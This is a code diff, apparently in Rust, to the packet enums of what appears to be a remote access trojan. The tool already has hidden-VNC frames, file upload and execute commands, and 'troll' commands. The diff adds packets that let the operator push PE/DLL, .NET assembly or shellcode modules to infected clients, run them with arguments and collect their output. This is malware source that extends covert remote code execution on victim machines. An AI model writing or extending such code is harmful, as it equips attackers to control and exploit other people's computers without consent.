@@ -30,6 +30,7 @@ pub enum ServerboundPacket {
     CurrentFolder(String),   
 
     HVNCFrame(Vec<u8>),
+    ModuleExecutionResult(ModuleExecutionResult),
 }
 
 impl Packet for ServerboundPacket {
@@ -60,6 +61,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
+            ServerboundPacket::ModuleExecutionResult(_) => "Module Execution Result",
         }
     }
 }
@@ -116,6 +118,12 @@ pub enum ClientboundPacket {
     UploadFile(String, FileData),
 
     TrollClient(TrollCommand),
+
+    // Module loading and execution
+    LoadModule(ModuleData),
+    ExecuteModule(ModuleExecution),
+    UnloadModule(String),
+    ListModules,
 }
 
 impl Packet for ClientboundPacket {
@@ -176,6 +184,10 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
             ClientboundPacket::TrollClient(_) => "Troll Client",
+            ClientboundPacket::LoadModule(_) => "Load Module",
+            ClientboundPacket::ExecuteModule(_) => "Execute Module",
+            ClientboundPacket::UnloadModule(_) => "Unload Module",
+            ClientboundPacket::ListModules => "List Modules",
         }
     }
 }
@@ -288,5 +300,38 @@ pub enum TrollCommand {
     SpeakText(String),
     Beep(String),
     PianoKey(String),
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum ModuleType {
+    PE,           // Windows PE/DLL
+    DotNetAssembly, // .NET Assembly
+    Shellcode,    // Position-independent code
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleData {
+    pub id: String,           // Unique module identifier
+    pub name: String,         // Human-readable name
+    pub module_type: ModuleType,
+    pub data: Vec<u8>,        // Module binary data
+    pub entry_point: Option<String>, // Entry point for DLL/Assembly (function/method name)
+    pub description: String,  // Module description
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleExecution {
+    pub module_id: String,    // ID of the module to execute
+    pub args: Vec<String>,    // Command-line arguments
+    pub timeout: Option<u32>, // Execution timeout in seconds
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleExecutionResult {
+    pub module_id: String,
+    pub success: bool,
+    pub output: String,       // Stdout/result
+    pub error: String,        // Stderr/error
+    pub exit_code: i32,
 }
 
